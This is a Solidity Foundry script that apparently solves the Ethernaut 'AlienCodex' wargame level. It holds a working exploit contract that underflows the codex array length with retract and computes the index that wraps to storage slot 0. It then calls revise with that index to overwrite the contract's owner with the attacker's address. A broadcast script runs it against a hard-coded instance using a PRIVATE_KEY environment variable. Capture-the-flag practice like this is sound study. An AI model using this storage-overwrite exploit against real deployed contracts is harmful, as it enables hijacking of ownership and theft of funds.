// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract AttackAlienCodex {

    function attack(address target) public {
        IAlienCodex alien = IAlienCodex(target);

        alien.makeContact();

        alien.retract();

        uint256 index = type(uint256).max 
            - uint256(keccak256(abi.encode(uint256(2)))) 
            + 1;

        alien.revise(
            index,
            bytes32(uint256(uint160(msg.sender)))
        );
    }
}

contract AlienCodexSolution is Script {

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address target = 0xcf55ff22ab6417d196A3AE81C3073A33aA310037; // your instance

        AttackAlienCodex attacker = new AttackAlienCodex();
        attacker.attack(target);

        vm.stopBroadcast();
    }
}